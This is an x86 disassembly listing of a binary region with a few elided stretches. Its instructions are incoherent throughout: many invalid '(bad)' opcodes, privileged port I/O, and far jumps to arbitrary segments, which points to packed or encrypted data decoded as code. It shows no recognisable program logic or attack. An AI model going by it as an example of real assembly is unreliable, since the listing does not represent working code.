  426811:	jmp    0x426863
  426813:	daa    
  426814:	iret   
  426815:	mov    cl,0x7
  426817:	pop    edi
  426818:	stc    
  426819:	rcl    DWORD PTR [ebx+0x7e],cl
  42681c:	outs   dx,DWORD PTR ds:[esi]
  42681d:	cld    
  42681e:	(bad)
  426821:	dec    ecx
  426822:	clc    
  426823:	loope  0x4267de
  426825:	mov    eax,fs:0xc405cf96
  42682b:	inc    ebx
  42682c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42682d:	fnstcw WORD PTR [esi+eiz*2+0x4d2b8efb]
  426834:	or     bl,cl
  426836:	add    ah,BYTE PTR [ecx+0x78f02558]
  42683c:	jbe    0x4267c9
  42683e:	call   ebx
  426840:	(bad)  
  426841:	mov    bh,0xb
  426843:	sbb    al,BYTE PTR [edi+ebp*4+0xd]
  426847:	mov    eax,0xe6654ea2
  42684c:	and    BYTE PTR [ebx+eiz*4],0xce
  426850:	pop    es
  426851:	loop   0x426801
  426853:	aam    0x9e
  426855:	mov    ds:0x83afeb0,eax
  42685a:	stc    
  42685b:	jno    0x4268bc
  42685d:	and    dh,dh
  42685f:	mov    al,0x52
  426861:	mov    dh,0x14
  426863:	xor    BYTE PTR [ecx-0x4bd2f174],ch
  426869:	and    eax,0xd803cbac
  42686e:	addr16 ret 0x9672
  426872:	or     BYTE PTR [ebx],al
  426874:	cmp    eax,0x6764aa54
  426879:	div    DWORD PTR [eax]
  42687b:	mov    esi,cs
  42687d:	xchg   BYTE PTR [ebp-0x4ef4af5],cl
  426883:	sbb    esp,ecx
  426885:	jmp    0xcd95:0x12406ff4
  42688c:	bound  edi,QWORD PTR [esp+esi*4+0x2ecfa845]
  426893:	add    edx,0x2c953285
  426899:	int    0x97
  42689b:	mov    esp,0x49227fce
  4268a0:	push   edx
  4268a1:	stos   DWORD PTR es:[edi],eax
  4268a2:	cld    
  4268a3:	js     0x42686c
  4268a5:	stc    
  4268a6:	pop    eax
  4268a7:	fst    QWORD PTR [ebx+0x49ce52b2]
  4268ad:	lods   eax,DWORD PTR ds:[esi]
  4268ae:	push   ebp
  4268af:	leave  
  4268b0:	outs   dx,DWORD PTR ds:[esi]
  4268b1:	ror    BYTE PTR [edi+0x1b],cl
  4268b4:	retf   
	...
  426915:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  42691c:	mov    edi,?
  42691e:	cs out 0xa0,eax
  426921:	stos   DWORD PTR es:[edi],eax
  426922:	test   eax,0x5e86dd61
  426927:	fwait
  426928:	add    DWORD PTR [eax],eax
  42692a:	pop    es
  42692b:	add    DWORD PTR [eax],eax
  42692d:	add    cl,ch
  42692f:	enter  0xaad7,0x89
  426933:	call   0xf2f3:0xa6805013
  42693a:	adc    eax,0x478609d7
  42693f:	and    eax,0xbc49a635
  426944:	fidiv  WORD PTR [edx+0x46b95d7e]
  42694a:	rcr    DWORD PTR [edi-0x54db1e5d],cl
  426950:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426951:	jle    0x426917
  426953:	mov    ah,0x2c
  426955:	lods   al,BYTE PTR ds:[esi]
  426956:	jbe    0x42692d
  426958:	jp     0x4268f7
  42695a:	push   ds
  42695b:	imul   esi,DWORD PTR [esi],0xffffffa9
  42695e:	sbb    BYTE PTR [ebp+0x67],cl
  426961:	or     ebx,esp
  426963:	sub    dh,ch
  426965:	cmp    BYTE PTR [ebp+0x4020fa93],dh
  42696b:	in     eax,dx
  42696c:	aad    0x87
  42696e:	in     eax,dx
  42696f:	test   DWORD PTR [ebx],ecx
  426971:	gs push ds
  426973:	mov    edx,0xc56c52df
  426978:	xchg   BYTE PTR [eax+0x34],bh
  42697b:	lahf   
  42697c:	xor    al,0x6d
  42697e:	adc    esp,DWORD PTR [eax+0x57]
  426981:	jmp    0x42698d
  426983:	test   eax,0x2ad52803
  426988:	sbb    eax,0x9d3491d9
  42698d:	xchg   ecx,eax
  42698e:	mov    DWORD PTR [ecx],eax
  426990:	sbb    eax,0xab67ae43
  426995:	sbb    al,0xed
  426997:	popf   
  426998:	jns    0x4269a8
  42699a:	sbb    BYTE PTR [edx-0xb87324f],cl
  4269a0:	inc    ecx
  4269a1:	jecxz  0x4269c5
  4269a3:	jmp    0xb50f:0x123bac7
  4269aa:	mov    al,ds:0xcb863b2
  4269af:	xor    BYTE PTR [ecx-0x7f],dl
  4269b2:	lock xchg ecx,eax
  4269b4:	pop    ecx
  4269b5:	and    dh,BYTE PTR [ebx+0x24468e9a]
  4269bb:	jmp    0x901d:0x8f6383f2
  4269c2:	retf   0x6fdf
  4269c5:	inc    esi
  4269c6:	daa    
  4269c7:	pop    ecx
  4269c8:	fidivr WORD PTR [esi-0x43229d7a]
  4269ce:	rcl    DWORD PTR [esi+ecx*8],1
  4269d1:	mov    BYTE PTR [ebx+0x215051d5],cl
  4269d7:	dec    ebp
  4269d8:	jg     0x42697b
  4269da:	sbb    ebx,DWORD PTR [esi-0x7e4f137f]
  4269e0:	inc    edi
  4269e1:	mov    BYTE PTR [ebp-0x34d67beb],cl
  4269e7:	dec    eax
  4269e8:	xchg   bh,ch
  4269ea:	push   0x20693c02
  4269ef:	int3   
  4269f0:	sti    
  4269f1:	cmp    al,0xd1
  4269f3:	jge    0x426a40
  4269f5:	pop    ss
  4269f6:	cwde   
  4269f7:	sar    DWORD PTR [ecx+0x11],0x9c
  4269fb:	inc    esi
  4269fc:	mov    bh,BYTE PTR [ecx]
  4269fe:	ror    DWORD PTR [edx],0x25
  426a01:	daa    
  426a02:	adc    DWORD PTR [esi-0x15],eax
  426a05:	push   edx
  426a06:	pop    esi
  426a07:	lods   eax,DWORD PTR ds:[esi]
  426a08:	mov    ds:0x87d8e65d,eax
  426a0d:	dec    edx
  426a0e:	dec    esi
  426a0f:	aam    0x11
  426a11:	jnp    0x4269f8
  426a13:	(bad)  
  426a14:	and    edx,DWORD PTR [ebp-0x20]
  426a17:	mov    al,ds:0x4271d0f
  426a1c:	shl    cl,1
  426a1e:	les    ecx,FWORD PTR [ecx-0x6e]
  426a21:	or     ecx,edx
  426a23:	mov    al,0x39
  426a25:	sar    DWORD PTR [edx+ecx*1+0x28dc560],cl
  426a2c:	dec    edx
  426a2d:	mov    ah,0x6e
  426a2f:	imul   esp,DWORD PTR ds:0x69792f27,0x0
	...
  426a95:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  426a9b:	ja     0x426a78
  426a9d:	out    dx,eax
  426a9e:	xor    dl,BYTE PTR [edi+eiz*4]
  426aa1:	cld    
  426aa2:	cmp    bl,BYTE PTR [ebp-0x639a5b76]
  426aa8:	add    DWORD PTR [eax],eax
  426aaa:	pop    es
  426aab:	add    DWORD PTR [eax],eax
  426aad:	add    BYTE PTR [eax-0x2018a062],bl
  426ab3:	(bad)  [ecx-0x626d6ab2]
  426ab9:	shr    edi,1
  426abb:	and    eax,0x6b6d97dd
  426ac0:	outs   dx,DWORD PTR ds:[esi]
  426ac1:	push   eax
  426ac2:	or     edx,esp
  426ac4:	add    bh,BYTE PTR [eax]
  426ac6:	mov    ?,WORD PTR [ebx]
  426ac8:	int3   
  426ac9:	adc    ah,cl
  426acb:	mov    al,bl
  426acd:	jne    0x426aae
  426acf:	jae    0x426b23
  426ad1:	xor    eax,0xc3d65c26
  426ad6:	jae    0x426b12
  426ad8:	jecxz  0x426a91
  426ada:	add    BYTE PTR ds:0xb784a6e9,0x85
  426ae1:	jno    0x426ae5
  426ae3:	ins    DWORD PTR es:[edi],dx
  426ae4:	popf   
  426ae5:	pop    ss
  426ae6:	push   ss
  426ae7:	adc    DWORD PTR [edi],esp
  426ae9:	xor    BYTE PTR [edx+0xc],ah
  426aec:	add    DWORD PTR [esi],ebx
  426aee:	mov    edx,DWORD PTR [esp+ebx*1-0x31]
  426af2:	xchg   esi,eax
  426af3:	or     eax,0xc9978d9a
  426af8:	(bad)  
  426af9:	xlat   BYTE PTR ds:[ebx]
  426afa:	sub    al,dh
  426afc:	imul   ebp,DWORD PTR [edx-0x6f5fd0c9],0x3c
  426b03:	jge    0x426b2f
  426b05:	adc    cl,bh
  426b07:	mov    bl,0xaf
  426b09:	aam    0x62
  426b0b:	pop    ds
  426b0c:	clc    
  426b0d:	xor    al,0x14
  426b0f:	mov    WORD PTR [edx-0x1f3e9276],cs
  426b15:	mov    edx,0xade0836d
  426b1a:	enter  0x9bec,0x89
  426b1e:	push   0x75
  426b20:	mov    fs,WORD PTR [edx]
  426b22:	iret   
  426b23:	adc    al,0x3d
  426b25:	jae    0x426ba5
  426b27:	mov    BYTE PTR [esi+0x57],al
  426b2a:	dec    ebx
  426b2b:	and    BYTE PTR [edx+0x71],0xf0
  426b2f:	retf   
  426b30:	(bad)  
  426b32:	leave  
  426b33:	xchg   ebp,eax
  426b34:	sar    DWORD PTR [ebp-0x17],0xc3
  426b38:	stos   BYTE PTR es:[edi],al
  426b39:	daa    
  426b3a:	in     eax,0x82
  426b3c:	dec    edx
  426b3d:	pusha  
  426b3e:	mov    edi,DWORD PTR [ebp-0x37]
  426b41:	adc    ch,BYTE PTR [ebp+0x1e]
  426b44:	adc    esp,esp
  426b46:	repz repnz (bad) 
  426b49:	push   cs
  426b4a:	xchg   ebp,eax
  426b4b:	mov    dh,0xe6
  426b4d:	xor    al,BYTE PTR [eax]
  426b4f:	sub    eax,0x21d6b
  426b54:	in     al,0xbf
  426b56:	mov    ecx,0xe013e11b
  426b5b:	and    bh,0x4a
  426b5e:	test   ebx,0x58f831bd
  426b64:	or     BYTE PTR [ebp+0x468e9f90],0x6e
  426b6b:	loope  0x426b5f
  426b6d:	pop    es
  426b6e:	jne    0x426b14
  426b70:	mov    edx,0xf20c581c
  426b75:	fcom   st(6)
  426b77:	stos   DWORD PTR es:[edi],eax
  426b78:	and    al,BYTE PTR [ecx+edx*8+0x26]
  426b7c:	xchg   DWORD PTR [esi+0x5671b454],eax
  426b82:	dec    esi
  426b83:	icebp  
  426b84:	add    eax,0x489fd323
  426b89:	mov    esp,0xdc256ce2
  426b8e:	outs   dx,BYTE PTR ds:[esi]
  426b90:	loopne 0x426bae
  426b92:	mov    ecx,0x7eb6869
  426b97:	push   edi
  426b98:	push   esi
  426b99:	push   eax
  426b9a:	out    dx,eax
  426b9b:	cli    
  426b9c:	xor    DWORD PTR [ebp+0x58],ecx
  426b9f:	jmp    0xb3439ea8
  426ba4:	xchg   esp,eax
  426ba5:	test   eax,0xb08149f5
  426baa:	call   0x8bf1:0x5d8094ec
  426bb1:	jne    0x426ba0
  426bb3:	push   es
  426bb4:	mov    ch,0x0
	...
  426c16:	loop   0x426c78
  426c18:	test   DWORD PTR [esi+0x74f3f787],esi
  426c1e:	je     0x426c67
  426c20:	push   0xffffffb6
  426c22:	aaa    
  426c23:	add    ecx,esi
  426c25:	xchg   BYTE PTR [ebp+ebx*4+0x1],ch
  426c29:	add    BYTE PTR [edi],al
  426c2b:	add    DWORD PTR [eax],eax
  426c2d:	add    bh,cl
  426c2f:	xor    al,0x14
  426c31:	test   al,0x38
  426c33:	inc    ebp
  426c34:	jg     0x426c9c
  426c36:	inc    esi
  426c37:	dec    ecx
  426c38:	js     0x426bbd
  426c3a:	xor    BYTE PTR [edx],dh
  426c3c:	imul   ebp,DWORD PTR [ecx],0xffffff9a
  426c3f:	(bad)  
  426c40:	aad    0x17
  426c42:	sbb    al,0xa1
  426c44:	xchg   edi,eax
  426c45:	icebp  
  426c46:	mov    eax,0xf3fbcfe3
  426c4b:	enter  0x4d32,0xc9
  426c4f:	dec    ebp
  426c50:	popa   
  426c51:	pop    ecx
  426c52:	jmp    0x70ff:0xa51346e4
  426c59:	mov    dh,0x93
  426c5b:	sbb    ecx,DWORD PTR [ecx+0x7ea8712a]
  426c61:	and    esp,DWORD PTR [ecx]
  426c63:	int    0x25
  426c65:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  426c67:	dec    esp
  426c68:	or     ch,BYTE PTR [edi+0xe4f0b96]
  426c6e:	inc    ebx
  426c6f:	mov    ebp,ebx
  426c71:	push   ebp
  426c72:	jb     0x426c3c
  426c74:	ds pop ecx
  426c76:	ins    BYTE PTR es:[edi],dx
  426c77:	mov    al,0x19
  426c79:	aaa    
  426c7a:	dec    edi
  426c7b:	sub    al,0x2e
  426c7d:	and    ebx,DWORD PTR [edi]
  426c7f:	mov    eax,DWORD PTR [ebx+0x27]
  426c82:	push   es
  426c83:	mov    cl,0x60
  426c85:	in     eax,dx
  426c86:	and    dl,BYTE PTR [edi]
  426c88:	add    DWORD PTR [ebp+0x53],0xa30228a9
  426c8f:	push   ebp
  426c90:	cmc    
  426c91:	std    
  426c92:	mov    ebx,0x5f166f9e
  426c97:	xor    al,0x49
  426c99:	cdq    
  426c9a:	stos   BYTE PTR es:[edi],al
  426c9b:	pop    eax
  426c9c:	pop    es
  426c9d:	stos   BYTE PTR es:[edi],al
  426c9e:	loope  0x426c7c
  426ca0:	int3   
  426ca1:	xchg   esp,eax
  426ca2:	in     al,dx
  426ca3:	into   
  426ca4:	mov    ebp,0xcdbc5dc
  426ca9:	push   esi
  426caa:	mov    dl,0x60
  426cac:	(bad)  
  426cad:	inc    DWORD PTR [ecx+0x28820fed]
  426cb3:	add    al,0xc3
  426cb5:	popf   
  426cb6:	inc    ecx
  426cb7:	sbb    eax,0xef79dac9
  426cbc:	jns    0x426ccc
  426cbe:	jbe    0x426d02
  426cc0:	sbb    eax,0x89cd7e50
  426cc5:	call   0x8bd11223
  426cca:	js     0x426c8f
  426ccc:	hlt    
  426ccd:	or     al,0x54
  426ccf:	cs jg  0x426c6b
  426cd2:	inc    ebp
  426cd3:	mov    BYTE PTR [ecx+0x76217713],ah
  426cd9:	ret    
  426cda:	xlat   BYTE PTR ds:[ebx]
  426cdb:	and    DWORD PTR [edi],eax
  426cdd:	push   ebx
  426cde:	neg    BYTE PTR [edx-0x3cc99204]
  426ce4:	inc    edi
  426ce5:	mov    dl,0xf8
  426ce7:	mov    dh,0x8c
  426ce9:	mov    esi,0xffed41d4
  426cee:	and    DWORD PTR [ebp-0x1050e78c],edx
  426cf4:	(bad)  
  426cf5:	fstp   TBYTE PTR [ecx]
  426cf7:	adc    BYTE PTR [edx],bh
  426cf9:	in     al,dx
  426cfa:	mov    bh,0xab
  426cfc:	jl     0x426d64
  426cfe:	dec    ecx
  426cff:	sub    DWORD PTR [esi],esi
  426d01:	aam    0xe6
  426d03:	dec    eax
  426d04:	sub    DWORD PTR [edx],eax
  426d06:	add    BYTE PTR [ecx],ah
  426d08:	retf   
  426d09:	ins    BYTE PTR es:[edi],dx
  426d0a:	retf   0xd708
  426d0d:	jmp    0x1e6add61
  426d12:	add    bh,bh
  426d14:	inc    esi
  426d15:	xor    BYTE PTR [eax-0xb585d26],dl
  426d1b:	mov    al,0x47
  426d1d:	(bad)  
  426d20:	jmp    0x426d72
  426d22:	pop    edi
  426d23:	int3   
  426d24:	outs   dx,BYTE PTR ds:[esi]
  426d25:	mov    cl,0x9b
  426d27:	(bad)  
  426d29:	es sub eax,0x1928679b
  426d2f:	ror    BYTE PTR [ebx-0x7f],cl
  426d32:	scas   eax,DWORD PTR es:[edi]
  426d33:	fidivr DWORD PTR [edx+0x0]
	...
  426d95:	add    BYTE PTR [edx],cl
  426d97:	mov    cl,0x61
  426d99:	repz sti 
  426d9b:	repz call 0x4f87:0x7e1b1bf9
  426da3:	add    bl,al
  426da5:	xchg   ecx,eax
  426da6:	jae    0x426d46
  426da8:	add    DWORD PTR [eax],eax
  426daa:	pop    es
  426dab:	add    DWORD PTR [eax],eax
  426dad:	add    BYTE PTR [ebp+0x46098649],bh
  426db3:	pop    ebp
  426db4:	cld    
  426db5:	(bad)  
  426db6:	jmp    0xdfd5c327
  426dbb:	pop    eax
  426dbc:	and    esi,DWORD PTR [esi+0x6a]
  426dbf:	fucomp st(0)
  426dc1:	sbb    DWORD PTR [ecx-0x4a],ecx
  426dc4:	dec    edi
  426dc5:	lea    esi,[eax]
  426dc7:	and    DWORD PTR [edi-0x7748aa86],edi
  426dcd:	mov    ds:0x225330e3,al
  426dd2:	daa    
  426dd3:	add    ah,bl
  426dd5:	ins    BYTE PTR es:[edi],dx
  426dd6:	mov    gs,WORD PTR [ecx-0x429f3b2e]
  426ddc:	ficom  WORD PTR [edi-0x64db6aaf]
  426de2:	stos   BYTE PTR es:[edi],al
  426de3:	ss aas 
  426de5:	daa    
  426de6:	add    bl,BYTE PTR [eax+0x612576b6]
  426dec:	jmp    0xfbfc80bd
  426df1:	outs   dx,DWORD PTR ds:[esi]
  426df2:	mov    bl,0xf6
  426df4:	push   ebp
  426df5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426df6:	and    BYTE PTR [edi],0x0
  426df9:	xor    bh,BYTE PTR [ecx]
  426dfb:	dec    eax
  426dfc:	into   
  426dfd:	jnp    0x426e01
  426dff:	rol    BYTE PTR ds:0x587070fa,cl
  426e05:	cmp    DWORD PTR [ecx+0x73],ebp
  426e08:	mov    dl,0x51
  426e0a:	dec    edi
  426e0b:	and    ebx,DWORD PTR [edx+0x21]
  426e0e:	aam    0xbe
  426e10:	loope  0x426ded
  426e12:	ja     0x426dcf
  426e14:	sub    DWORD PTR [eax+0x4a],esi
  426e17:	push   eax
  426e18:	leave  
  426e19:	inc    edi
  426e1a:	jb     0x426df4
  426e1c:	sbb    al,0x67
  426e1e:	mov    ebp,0xbb1955f0
  426e23:	inc    edi
  426e24:	popf   
  426e25:	adc    ebx,DWORD PTR [edx+0x65]
  426e28:	pop    ss
  426e29:	mov    edx,0x5469860e
  426e2e:	xchg   edi,eax
  426e2f:	sbb    BYTE PTR [eax+0x2e],0x79
  426e33:	mov    ch,0x5f
  426e35:	ret    
  426e36:	adc    al,BYTE PTR [ebp+0x360aed76]
  426e3c:	es or  ebx,eax
  426e3f:	fild   DWORD PTR [ebp+0x6b]
  426e42:	push   edx
  426e43:	enter  0x857,0x81
  426e47:	sbb    al,0x49
  426e49:	stc    
  426e4a:	push   ss
  426e4b:	inc    esp
  426e4c:	arpl   WORD PTR [eax+esi*4-0x7d048c67],si
  426e53:	or     ebx,eax
  426e55:	mov    dh,0x55
  426e57:	jne    0x426e34
  426e59:	jmp    0x17bc:0xcda1242a
  426e60:	xchg   esi,eax
  426e61:	loop   0x426e13
  426e63:	adc    esi,0xca18a95c
  426e69:	xlat   BYTE PTR ds:[ebx]
  426e6a:	sbb    DWORD PTR [edi-0x32],ebx
  426e6d:	(bad)  
  426e6e:	hlt    
  426e6f:	imul   esi,DWORD PTR [esi-0xa],0xffffffec
  426e73:	out    0x4,al
  426e75:	lods   eax,DWORD PTR ds:[esi]
  426e76:	pop    esi
  426e77:	mov    cl,0x3b
  426e79:	out    dx,al
  426e7a:	(bad)  
  426e7b:	loopne 0x426ecd
  426e7d:	adc    cl,BYTE PTR [esi+0x2e]
  426e80:	add    eax,0x9c904f29
  426e85:	call   0x1989:0xa2e76b91
  426e8c:	jo     0x426ee7
  426e8e:	ja     0x426ed9
  426e90:	jae    0x426edc
  426e92:	cmp    BYTE PTR [edi+0x4d],0xb6
  426e96:	xchg   esp,eax
  426e97:	fisub  WORD PTR [esi+0x4b]
  426e9a:	cmp    DWORD PTR [ebx],ebp
  426e9c:	mov    edi,0x65a89945
  426ea1:	sbb    BYTE PTR [ebx],dl
  426ea3:	ret    0x5eec
  426ea6:	hlt    
  426ea7:	test   al,0xdf
  426ea9:	fs jmp 0x502a82ff
  426eaf:	jge    0x426e7f
  426eb1:	or     eax,0xcca9b2
	...
  426f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f17:	mov    ds:0xf5c7f1c7,al
  426f1c:	mov    dh,0xf7
  426f1e:	pop    eax
  426f1f:	or     BYTE PTR [ecx+0x13275fa4],ch
  426f25:	scas   eax,DWORD PTR es:[edi]
  426f26:	jp     0x426ec7
  426f28:	add    DWORD PTR [eax],eax
  426f2a:	pop    es
  426f2b:	add    DWORD PTR [eax],eax
  426f2d:	add    dl,ch
  426f2f:	dec    eax
  426f30:	sub    BYTE PTR [eax-0x5],dl
  426f33:	pop    ss
  426f34:	or     al,BYTE PTR [edx]
  426f36:	es (bad) 
  426f38:	sbb    al,0x57
  426f3a:	mov    WORD PTR [eax-0x27],fs
  426f3d:	aaa    
  426f3e:	mov    BYTE PTR [edi-0x7abffef0],0x91
  426f45:	mov    esp,0x7ccade05
  426f4a:	dec    edx
  426f4b:	sbb    DWORD PTR [edx-0x3c584ef2],ebp
  426f51:	sub    bh,dh
  426f53:	lock stos BYTE PTR es:[edi],al
  426f55:	pop    ss
  426f56:	push   cs
  426f57:	mov    esp,0x4644481a
  426f5c:	xchg   ebp,esi
  426f5e:	xor    BYTE PTR [eax],bl
  426f60:	xor    eax,0x8b89ee1d
  426f65:	mov    ch,0x9a
  426f67:	data16 and al,bh
  426f6a:	rol    ebx,1
  426f6c:	call   0xb68b1124
  426f71:	lods   eax,DWORD PTR ds:[si]
  426f73:	push   es
  426f74:	sti    
  426f75:	push   es
  426f76:	mov    bl,0xfa
  426f78:	aaa    
  426f79:	fs push ebx
  426f7b:	ja     0x426f4e
  426f7d:	ffree  st(7)
  426f7f:	iret   
  426f80:	dec    eax
  426f81:	retf   0x748a
  426f84:	dec    ecx
  426f85:	push   ecx
  426f86:	jb     0x426fbb
  426f88:	mov    eax,ds:0x5dbb14d1
  426f8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f8e:	xchg   ebx,eax
  426f8f:	lea    esi,[esi-0xc82ed44]
  426f95:	enter  0x3f7a,0xd8
  426f99:	ins    BYTE PTR es:[edi],dx
  426f9a:	inc    ebx
  426f9b:	fwait
  426f9c:	mov    al,0x4d
  426f9e:	jle    0x426fe8
  426fa0:	das    
  426fa1:	add    BYTE PTR [edx+0x37],dl
  426fa4:	adc    cl,bl
  426fa6:	push   edi
  426fa7:	sub    bh,BYTE PTR [eax]
  426fa9:	push   eax
  426faa:	xchg   ebx,eax
  426fab:	stos   DWORD PTR es:[edi],eax
  426fac:	call   0x6019:0xb7d6fa90
  426fb3:	mov    WORD PTR ss:[edi],ds
  426fb6:	in     eax,dx
  426fb7:	mov    ebp,0x89c6926f
  426fbc:	inc    edi
  426fbd:	outs   dx,BYTE PTR ds:[esi]
  426fbe:	jnp    0x426fb7
  426fc0:	mov    DWORD PTR [ecx],esi
  426fc2:	icebp  
  426fc3:	mov    ds:0xace2f0bf,eax
  426fc8:	jb     0x426f83
  426fca:	xchg   DWORD PTR [ecx],ebx
  426fcc:	jle    0x427013
  426fce:	cmp    DWORD PTR gs:[eax+0x89e3b3e],0x7b
  426fd6:	xor    DWORD PTR [edi],ebx
  426fd8:	jnp    0x426f9a
  426fda:	dec    edi
  426fdb:	cld    
  426fdc:	(bad)  
  426fdd:	and    bh,dh
  426fdf:	arpl   WORD PTR ds:0x2d45d4e1,ax
  426fe5:	mov    esp,0xfc7b03aa
  426fea:	xor    BYTE PTR [edi],bh
  426fec:	in     eax,0xf5
  426fee:	mov    dh,0x1b
  426ff0:	fnstsw WORD PTR [ebp-0x2f]
  426ff3:	retf   0x4fcc
  426ff6:	dec    edi
  426ff7:	mov    ebx,DWORD PTR [ecx]
  426ff9:	lods   eax,DWORD PTR ds:[esi]
  426ffa:	adc    al,BYTE PTR [esi+0x55]
  426ffd:	inc    eax
  426ffe:	add    DWORD PTR [edi+0x11dd7bde],0x2ca43116
  427008:	push   eax
  427009:	mov    WORD PTR [bp+si-0x6c],cs
  42700d:	mov    ?,ebp
  42700f:	mov    DWORD PTR [ebx-0x78],ebp
  427012:	or     DWORD PTR [ecx+0x70],ecx
  427015:	and    al,0xd6
  427017:	scas   al,BYTE PTR es:[edi]
  427018:	sahf   
  427019:	xor    ecx,DWORD PTR [eax-0x14c49d04]
  42701f:	cmp    al,BYTE PTR [ecx+0x73]
  427022:	stc    
  427023:	aas    
  427024:	out    0x1c,eax
  427026:	and    al,0xa
  427028:	out    dx,eax
  427029:	or     eax,0x6ca065fa
  42702e:	xchg   edx,eax
  42702f:	lds    eax,FWORD PTR [ebx-0x5b1ad9cb]
	...
  427095:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  42709c:	(bad)  
  42709d:	std    
  42709e:	stos   DWORD PTR es:[edi],eax
  42709f:	sbb    DWORD PTR [eax-0x614dd73a],eax
  4270a5:	or     al,BYTE PTR [ecx+0x70001a0]
  4270ab:	add    DWORD PTR [eax],eax
  4270ad:	add    dl,dh
  4270af:	test   DWORD PTR [eax-0x622e0246],esp
  4270b5:	retf   0x5a28
  4270b8:	out    0x28,al
  4270ba:	or     al,0x4e
  4270bc:	pop    es
  4270bd:	cmp    edx,DWORD PTR [esi+0x379443af]
  4270c3:	dec    eax
  4270c4:	mov    ebp,0xaffffd8a
  4270c9:	test   al,0x22
  4270cb:	jne    0x4270a2
  4270cd:	adc    esp,ecx
  4270cf:	xchg   esp,eax
  4270d0:	add    BYTE PTR [esi+0x1fa8c8ec],0x1b
  4270d7:	enter  0xe144,0x1e
  4270db:	loopne 0x42713c
  4270dd:	nop
  4270de:	pop    esp
  4270df:	jbe    0x427081
  4270e1:	mov    esi,0x35cabefb
  4270e6:	in     eax,0x84
  4270e8:	mov    ss:0x9fc6a78c,eax
  4270ee:	icebp  
  4270ef:	lock sti 
  4270f1:	shl    DWORD PTR [esi],1
  4270f3:	push   0xffffffae
  4270f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4270f6:	sbb    BYTE PTR [edx+0x31],dh
  4270f9:	jge    0x427175
  4270fb:	mov    cs,WORD PTR ds:0x76a2aaad
  427101:	mov    es,WORD PTR [ebp-0x78]
  427104:	mov    BYTE PTR [edi-0x20],al
  427107:	stc    
  427108:	sbb    al,0x1e
  42710a:	loop   0x42715d
  42710c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42710d:	std    
  42710e:	outs   dx,BYTE PTR ds:[esi]
  42710f:	push   eax
  427110:	pop    ecx
  427111:	cmp    eax,0x7763bb44
  427116:	sub    ecx,DWORD PTR [ebx+0x6bec2592]
  42711c:	rcr    al,cl
  42711e:	mov    ebp,0xdd2cb2b3
  427123:	sub    eax,0xfd878ffb
  427128:	lea    ebx,[ebx+esi*1+0x4d8d4f6d]
  42712f:	sbb    eax,0x98231946
  427134:	xchg   DWORD PTR [esi+0x68bc934c],ebx
  42713a:	arpl   WORD PTR [ebx-0x71d214d],di
  427140:	xchg   esp,eax
  427141:	and    eax,0x5bc4e644
  427146:	adc    al,BYTE PTR [esi+eiz*2]
  427149:	jbe    0x4270e7
  42714b:	cli    
  42714c:	mov    al,0x78
  42714e:	mov    dl,0x6e
  427150:	fisub  DWORD PTR [esi-0x5473a2d7]
  427156:	lock push ebp
  427158:	mov    dh,0xbb
  42715a:	jge    0x4271c2
  42715c:	aad    0x27
  42715e:	pop    ecx
  42715f:	jl     0x42712f
  427161:	sub    BYTE PTR [esi+0x40bb32c3],0x26
  427168:	sahf   
  427169:	sub    ebx,ebx
  42716b:	push   es
  42716c:	pop    ss
  42716d:	dec    edx
  42716e:	push   edi
  42716f:	jecxz  0x42713e
  427171:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427172:	pslld  mm4,QWORD PTR [ecx-0x4b73a5e9]
  427179:	xchg   ecx,eax
  42717a:	test   eax,0x50b98271
  42717f:	adc    eax,0x28a68ab0
  427184:	mov    fs,WORD PTR [edi-0x7d]
  427187:	sub    BYTE PTR [ecx],dl
  427189:	xor    al,0x11
  42718b:	pop    ebx
  42718c:	push   0x929513cb
  427191:	adc    al,0xc7
  427193:	repnz out 0xc4,eax
  427196:	and    DWORD PTR [esi+0x7b],0x6252a35
  42719d:	or     eax,0xd6ca74e4
  4271a2:	xchg   ecx,eax
  4271a3:	xchg   DWORD PTR [esi+0x5e791633],ecx
  4271a9:	js     0x42715f
  4271ab:	add    dh,ah
  4271ad:	mov    ebx,0xeb88ece2
  4271b2:	(bad)  
  4271b3:	lods   al,BYTE PTR ds:[esi]
  4271b4:	ja     0x4271b6
	...
  427216:	push   ds
  427217:	inc    ecx
  427218:	fdiv   QWORD PTR [edi+ebx*8+0x77eb7ebd]
  42721f:	push   0x1c8b0100
  427224:	(bad)  
  427225:	sahf   
  427226:	mov    BYTE PTR [ecx+0x1070001],ah
  42722c:	add    BYTE PTR [eax],al
  42722e:	dec    edx
  42722f:	call   0x82d06d43
  427234:	lock mov DWORD PTR [edx],ebx
  427237:	fidiv  WORD PTR [eax+0x7d]
  42723a:	sub    DWORD PTR [ecx+0x5d6d0952],edi
  427240:	sub    eax,0xa21f63a6
  427245:	sub    eax,0x86a17fd2
  42724a:	out    dx,eax
  42724b:	test   edi,ebp
  42724d:	and    eax,0x281d5ddf
  427252:	push   ebx
  427253:	icebp  
  427254:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427255:	outs   dx,BYTE PTR ds:[esi]
  427256:	test   BYTE PTR [ecx],ah
  427258:	push   ecx
  427259:	cli    
  42725a:	jns    0x427277
  42725c:	pop    ecx
  42725d:	int3   
  42725e:	inc    eax
  42725f:	call   DWORD PTR [ebx]
  427261:	mov    dh,0xf8
  427263:	lods   al,BYTE PTR ds:[esi]
  427264:	out    0x4f,eax
  427266:	add    al,0xf6
  427268:	adc    BYTE PTR [eax+0x7d],bh
  42726b:	shl    BYTE PTR ds:0x7eff8705,cl
  427271:	mov    dh,0x81
  427273:	push   edx
  427274:	sbb    DWORD PTR [edi+edi*2],edx
  427277:	xchg   ebp,eax
  427278:	fstp   TBYTE PTR [ecx-0x5941580]
  42727e:	cmc    
  42727f:	stos   DWORD PTR es:[edi],eax
  427280:	retf   0xe9d
  427283:	jbe    0x427291
  427285:	fxtract 
  427287:	ds pop edx
